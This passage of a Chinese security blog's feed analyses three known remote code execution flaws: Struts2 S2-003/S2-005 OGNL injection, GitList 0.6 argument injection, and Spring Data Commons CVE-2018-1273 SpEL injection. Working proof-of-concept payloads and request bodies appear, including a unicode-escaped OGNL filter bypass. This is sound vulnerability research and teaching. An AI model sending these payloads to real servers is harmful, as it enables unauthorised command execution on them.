class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))</div></pre></td></tr></table></figure></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:177 获取到我们传入的参数</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/2.png?raw=true" alt=""></p>
<p>在<code>getValueStack</code>之前，执行了一些初始化操作，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OgnlContextState.setDenyMethodExecution(contextMap, true);</div></pre></td></tr></table></figure></p>
<p>将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为<code>true</code>。为了能够调用方法，需要在poc中的第一部分将<code>denyMethodExecution</code>设置为<code>false</code>，之后才能任意代码执行。</p>
<p>跟入<code>setParameters(action, stack, parameters);</code>至 struts/struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:201。此部分开始通过迭代器取出一个个传入的参数，并进行处理。</p>
<p>假设此时我传入的参数如下，注意这个与poc的不同在于，我将第一个<code>\u0023</code>替换成了<code>#</code>。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;#context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/3.png?raw=true" alt=""></p>
<p>跟入<code>acceptableName</code>至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:271<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">acceptableName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>跟入<code>isAccepted(name)</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/4.png?raw=true" alt=""></p>
<p>这里通过简单的正则表达式<code>[\p{Graph}&amp;&amp;[^,#:=]]*</code>来检测，防止传入恶意特殊字符开头如<code>#</code>等。因此<code>acceptableName</code>返回false，接下来的ognl表达式自然也不会执行了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (acceptableName) &#123;</div><div class="line">    Object value = entry.getValue();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>但如果传入经过编码后的payload。<code>#</code>对应的unicode为<code>\u0023</code>，八进制为<code>\43</code>，则可以绕过上述的检测，也即导致<code>acceptableName</code>为true，从而进一步执行。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/5.png?raw=true" alt=""></p>
<p>在设置<code>denyMethodExecution</code>为false后，poc的第二部分就是通过方法调用来执行任意命令了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/6.png?raw=true" alt=""></p>
<h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows remote command execution</p>
<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/7.png?raw=true" alt=""></p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>S2-005的出现时因为官方对S2-003的修补的不完全导致的。官方通过增加安全配置禁止静态方法调用（allowStaticMethodAcces）和类方法执行（MethodAccessor.den<br>yMethodExecution）等来修补。但同样的直接使用上面的技巧，更改poc为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023_memberAccess[\&apos;allowStaticMethodAccess\&apos;]&apos;)(meh)=true&amp;(aaa)((&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003d\u0023foo&apos;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&apos;\u0023rt.exit(1)&apos;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</div></pre></td></tr></table></figure></p>
<p>即可设置<code>allowStaticMethodAccess</code>为true，和<code>denyMethodExecution</code>为false，从而导致任意命令执行。可以参考<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="external">Struts2漏洞分析与研究之S2-005漏洞分析</a>和<a href="http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html" target="_blank" rel="external">CVE-2010-1870: Struts2/XWork remote command execution</a>。其余的代码调用等，与S2-003相同，分析见上。</p>
<h1 id="ognl的解析"><a href="#ognl的解析" class="headerlink" title="ognl的解析"></a>ognl的解析</h1><p>一个问题，为什么<code>\u0023</code>形式的poc能够被解析呢？<br><img src="" alt=""><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true" target="_blank" rel="external">https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true</a></p>
<p>跟入<code>setValue</code> 至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlValueStack.java:170</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/10.png?raw=true" alt=""></p>
<p>跟入<code>OgnlUtil.setValue</code>,struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlUtil.java:185</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String name, Map context, Object root, Object value)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</div><div class="line">    Ognl.setValue(compile(name), context, root, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>此处name即我们传入的参数<code>(\u0023...</code>，跟入<code>compile</code>中的<code>o = Ognl.parseExpression(expression);</code>:</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/11.png?raw=true" alt=""></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parseExpression</span><span class="params">( String expression )</span> <span class="keyword">throws</span> OgnlException</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        OgnlParser parser = <span class="keyword">new</span> OgnlParser( <span class="keyword">new</span> StringReader(expression) );</div><div class="line">        <span class="keyword">return</span> parser.topLevelExpression();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>从<code>topLevelExpression</code>就开始了进行语法分析工作。在获得<code>(</code>的token为44后，接着进行<code>expression();</code>的解析。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/12.png?raw=true" alt=""></p>
<p>在其中会调用到 ognl/JavaCharStream.java 的<code>readChar</code>。其中代码摘取部分如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> <span class="keyword">throws</span> java.io.IOException</span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) == <span class="string">'\\'</span>)</div><div class="line">    &#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">int</span> backSlashCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) <span class="comment">// Read all the backslashes</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) != <span class="string">'\\'</span>)</div><div class="line">            &#123;</div><div class="line">                UpdateLineColumn(c);</div><div class="line">                <span class="comment">// found a non-backslash char.</span></div><div class="line">                <span class="keyword">if</span> ((c == <span class="string">'u'</span>) &amp;&amp; ((backSlashCnt &amp; <span class="number">1</span>) == <span class="number">1</span>))</div><div class="line">                &#123;</div><div class="line">                <span class="keyword">if</span> (--bufpos &lt; <span class="number">0</span>)</div><div class="line">                    bufpos = bufsize - <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                backup(backSlashCnt);</div><div class="line">                <span class="keyword">return</span> <span class="string">'\\'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<p>读取<code>\</code>，并在之后如果遇到了<code>u</code>则进一步处理：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/13.png?raw=true" alt=""><br>从而把<code>\u0023</code>转换成了<code>#</code>。之后执行ognl表达式时即执行<code>&quot;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false&quot;</code></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/14.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2323&quot;&gt;阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005&lt;/a&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
    
      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
    
  </entry>
  
  <entry>
    <title>GitList 0.6 Unauthenticated RCE 分析</title>
    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
    <published>2018-04-30T04:25:26.000Z</published>
    <updated>2018-05-01T12:14:53.244Z</updated>
    
    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
<blockquote>
<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
</blockquote>
<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> . $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
<blockquote>
<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
</blockquote>
<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</title>
    <link href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/"/>
    <id>http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/</id>
    <published>2018-04-11T15:35:54.000Z</published>
    <updated>2018-04-12T14:36:41.506Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2269" target="_blank" rel="external">Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</a><br><a id="more"></a></p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a href="https://pivotal.io/security/cve-2018-1273" target="_blank" rel="external">https://pivotal.io/security/cve-2018-1273</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/1.jpg?raw=true" alt=""></p>
<p>漏洞影响版本：</p>
<ul>
<li>2.0.x users should upgrade to 2.0.6</li>
<li>1.13.x users should upgrade to 1.13.11</li>
<li>Older versions should upgrade to a supported branch</li>
</ul>
<h1 id="探索过程"><a href="#探索过程" class="headerlink" title="探索过程"></a>探索过程</h1><p>从漏洞公告页的Refference给出的两个链接<a href="https://github.com/spring-projects/spring-data-commons/commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a" target="_blank" rel="external">commit/b1a20ae1e82a63f99b3afc6f2aaedb3bf4dc432a</a>和<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a>，可以看出该漏洞为SpEL注入。</p>
<p>在漏洞发现者<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>的<a href="https://twitter.com/h3xstream/status/984098634353475584" target="_blank" rel="external">推文和回复</a>中提到：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.jpg?raw=true" alt=""><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@requestMapping</span>(<span class="string">"/users"</span>)</div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</div><div class="line">    <span class="meta">@requestsMapping</span>(method= RequestMethod.POST)</div><div class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">register</span><span class="params">(UserForm userForm, BindingResult binding, Model model)</span></span>&#123;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>此外 <a href="https://twitter.com/SpringData" target="_blank" rel="external">Spring Data Team @SpringData</a>在该推文中回复：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Spring Data Team</div><div class="line">‏That&apos;s only true if the form backing object is a projection interface. Simple DTOs are safe.</div></pre></td></tr></table></figure></p>
<p>因此可以推测出几个漏洞条件：</p>
<ol>
<li>Spel注入</li>
<li>a form accessible</li>
<li>form backing object is a projection interface</li>
</ol>
<p>另外根据<a href="https://twitter.com/h3xstream" target="_blank" rel="external">Philippe Arteau @h3xstream</a>提供的示例代码，不难发现这是spring官方的<a href="https://github.com/spring-projects/spring-data-examples/blob/master/web/example/src/main/java/example/users/web/UserController.java#L83" target="_blank" rel="external">示例代码 spring-data-examples 中的一部分</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/3.jpg?raw=true" alt=""></p>
<p>因此环境搭建以及漏洞探索过程不妨从此入手。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/spring-projects/spring-data-examples</div></pre></td></tr></table></figure>
<p>我直接采用默认配置pom.xml，对应的Spring Data Commons版本为2.0.5<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/9.jpg?raw=true" alt=""></p>
<p>运行其中的web\example。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/4.jpg?raw=true" alt=""><br>这是一个简单的注册页面，输入用户名、密码并重复。</p>
<p>抓包，修改payload数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;calc.exe&quot;)]=chybeta&amp;password=chybeta&amp;repeatedPassword=chybeta</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/2.gif?raw=true" alt=""></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>限于能力，还真不知道这个洞该从何谈起。干脆就定位到 org/springframework/data/web/MapDataBinder.java:174 。之所以定位到这里，官方的<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="external">commit</a>中在这里去除了StandardEvaluationContext，改用SimpleEvaluationContext。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/5.jpg?raw=true" alt=""><br>可以看到这里的propertyName即我们传入的参数名，其中带有了payaload。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180412/6.jpg?raw=true" alt=""><br>继续执行至187行，对其进行解析<code>parseExpression(propertyName)</code></p>
